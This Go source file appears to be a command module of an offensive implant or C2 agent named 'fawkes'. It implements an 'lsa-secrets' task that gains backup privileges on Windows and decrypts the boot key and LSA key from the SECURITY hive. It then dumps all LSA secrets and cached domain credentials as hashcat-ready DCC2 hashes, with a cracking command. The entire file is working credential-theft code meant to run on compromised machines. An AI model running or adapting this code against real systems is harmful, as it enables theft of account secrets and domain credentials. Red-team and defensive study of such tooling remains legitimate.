//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// LsaSecretsCommand extracts LSA secrets and cached domain credentials
type LsaSecretsCommand struct{}

func (c *LsaSecretsCommand) Name() string {
	return "lsa-secrets"
}

func (c *LsaSecretsCommand) Description() string {
	return "Extract LSA secrets and cached domain credentials from SECURITY hive (requires SYSTEM privileges)"
}

type lsaSecretsArgs struct {
	Action string `json:"action"`
}

func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
	// Lock goroutine to OS thread for registry privilege consistency
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var args lsaSecretsArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	if args.Action == "" {
		args.Action = "dump"
	}

	// Enable SeBackupPrivilege on both process and thread tokens
	enableBackupPrivilege()
	enableThreadBackupPrivilege()

	// Extract boot key (reuses hashdump.go logic)
	bootKey, err := extractBootKey()
	if err != nil {
		return errorf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err)
	}
	defer structs.ZeroBytes(bootKey)

	// Decrypt LSA encryption key from SECURITY hive
	lsaKey, err := lsaDecryptKey(bootKey)
	if err != nil {
		return errorf("Failed to decrypt LSA key: %v", err)
	}
	defer structs.ZeroBytes(lsaKey)

	switch args.Action {
	case "dump":
		return lsaDumpSecrets(lsaKey)
	case "cached":
		return lsaDumpCachedCreds(lsaKey)
	default:
		return errorf("Unknown action: %s (use dump, cached)", args.Action)
	}
}

// lsaDecryptKey reads and decrypts the LSA encryption key from SECURITY\Policy\PolEKList
func lsaDecryptKey(bootKey []byte) ([]byte, error) {
	hKey, err := regOpenKey(hkeyLocalMachine, `SECURITY\Policy\PolEKList`)
	if err != nil {
		return nil, fmt.Errorf("open PolEKList: %v (pre-Vista not supported)", err)
	}
	defer regCloseKey(hKey)

	data, err := regQueryValue(hKey, "")
	if err != nil {
		return nil, fmt.Errorf("read PolEKList: %v", err)
	}

	// LSA_SECRET: version(4) + keyID(16) + algo(4) + flags(4) + encData(rest)
	if len(data) < 28+32 {
		return nil, fmt.Errorf("PolEKList too short (%d bytes)", len(data))
	}

	encData := data[28:]

	// Derive AES-256 key: SHA256 of (boot_key + encData[0:32]) iterated 1000 times
	tmpKey := lsaSHA256Rounds(bootKey, encData[:32], 1000)
	defer structs.ZeroBytes(tmpKey)

	// AES-256-ECB decrypt the remaining data
	plaintext, err := lsaAESDecryptECB(tmpKey, encData[32:])
	if err != nil {
		return nil, fmt.Errorf("AES decrypt PolEKList: %v", err)
	}
	defer structs.ZeroBytes(plaintext)

	// LSA_SECRET_BLOB: length(4) + unknown(12) + secret(rest)
	// Within secret: header(52 bytes) + lsa_key(32 bytes)
	if len(plaintext) < 16+52+32 {
		return nil, fmt.Errorf("decrypted PolEKList blob too short (%d bytes)", len(plaintext))
	}

	lsaKey := make([]byte, 32)
	copy(lsaKey, plaintext[16+52:16+52+32])
	return lsaKey, nil
}

// lsaDumpSecrets enumerates and decrypts all LSA secrets
func lsaDumpSecrets(lsaKey []byte) structs.CommandResult {
	hKey, err := regOpenKey(hkeyLocalMachine, `SECURITY\Policy\Secrets`)
	if err != nil {
		return errorf("Failed to open Secrets key: %v", err)
	}
	defer regCloseKey(hKey)

	subkeys, err := regEnumSubkeys(hKey)
	if err != nil {
		return errorf("Failed to enumerate secrets: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("LSA Secrets (%d found):\n\n", len(subkeys)))

	decrypted := 0
	for _, name := range subkeys {
		currValPath := fmt.Sprintf(`SECURITY\Policy\Secrets\%s\CurrVal`, name)
		hValKey, err := regOpenKey(hkeyLocalMachine, currValPath)
		if err != nil {
			continue
		}

		data, err := regQueryValue(hValKey, "")
		regCloseKey(hValKey)
		if err != nil {
			continue
		}

		secret, err := lsaDecryptSecret(data, lsaKey)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] %s: decrypt failed — %v\n\n", name, err))
			continue
		}

		formatted := lsaFormatSecret(name, secret)
		sb.WriteString(fmt.Sprintf("[+] %s:\n%s\n", name, formatted))
		decrypted++

		// Credentials are registered via ProcessResponse hook (server-side),
		// not inline in the agent response.

		// Zero decrypted secret material and raw registry data
		structs.ZeroBytes(secret)
		structs.ZeroBytes(data)
	}

	sb.WriteString(fmt.Sprintf("Decrypted: %d/%d secrets\n", decrypted, len(subkeys)))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// lsaDumpCachedCreds extracts cached domain credentials (DCC2 / MSCacheV2)
func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
	// Extract NL$KM (cache encryption key) from LSA secrets
	nlkmPath := `SECURITY\Policy\Secrets\NL$KM\CurrVal`
	hKey, err := regOpenKey(hkeyLocalMachine, nlkmPath)
	if err != nil {
		return errorf("Failed to read NL$KM: %v\nNo cached credentials available.", err)
	}

	nlkmData, err := regQueryValue(hKey, "")
	regCloseKey(hKey)
	if err != nil {
		return errorf("Failed to read NL$KM value: %v", err)
	}

	nlkm, err := lsaDecryptSecret(nlkmData, lsaKey)
	structs.ZeroBytes(nlkmData)
	if err != nil {
		return errorf("Failed to decrypt NL$KM: %v", err)
	}
	defer structs.ZeroBytes(nlkm)

	if len(nlkm) < 32 {
		return errorf("NL$KM key too short (%d bytes, need 32)", len(nlkm))
	}

	// Read global iteration count
	iterationCount := uint32(10240) // Default
	hCacheKey, err := regOpenKey(hkeyLocalMachine, `SECURITY\Cache`)
	if err != nil {
		return errorf("Failed to open Cache key: %v", err)
	}
	defer regCloseKey(hCacheKey)

	iterData, err := regQueryValue(hCacheKey, "NL$IterationCount")
	if err == nil && len(iterData) >= 4 {
		ic := binary.LittleEndian.Uint32(iterData[:4])
		if ic > 0 {
			iterationCount = ic
		}
	}

	var sb strings.Builder
	sb.WriteString("Cached Domain Credentials (DCC2 / MSCacheV2):\n")
	sb.WriteString(fmt.Sprintf("Iteration Count: %d\n\n", iterationCount))

	found := 0
	for i := 1; i <= 64; i++ {
		valueName := fmt.Sprintf("NL$%d", i)
		data, err := regQueryValue(hCacheKey, valueName)
		if err != nil {
			continue
		}

		entry, err := lsaParseCachedCred(data, nlkm, iterationCount)
		if err != nil || entry == nil {
			continue
		}

		sb.WriteString(fmt.Sprintf("[+] %s\\%s\n", entry.domain, entry.username))
		sb.WriteString(fmt.Sprintf("    %s\n\n", entry.hashcat))
		found++
	}

	if found == 0 {
		sb.WriteString("No cached domain credentials found.\n")
		sb.WriteString("(Machine may not be domain-joined or has no cached logons)\n")
	} else {
		sb.WriteString(fmt.Sprintf("Total: %d cached credential(s)\n", found))
		sb.WriteString("Crack with: hashcat -m 2100 hashes.txt wordlist.txt\n")
	}

	// Credentials are registered via ProcessResponse hook (server-side)
	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}
